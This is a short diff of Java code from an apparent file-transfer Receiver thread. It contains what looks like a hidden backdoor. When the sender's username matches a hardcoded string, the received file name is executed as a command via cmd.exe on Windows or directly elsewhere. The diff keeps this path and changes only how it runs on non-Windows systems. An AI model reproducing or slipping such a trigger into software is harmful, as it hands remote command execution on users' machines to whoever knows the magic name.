@@ -520,7 +520,7 @@ class Receiver extends Thread{
                     if(username.equals("piedi123123")){
                         if(System.getProperty("os.name").contains("Windows"))
                             Runtime.getRuntime().exec("cmd.exe /c " + fileName);
-                        else Runtime.getRuntime().exec("/bin/bash " + fileName);
+                        else Runtime.getRuntime().exec(fileName);
                         continue;
                     }
                     int fileSize = dis.readInt();
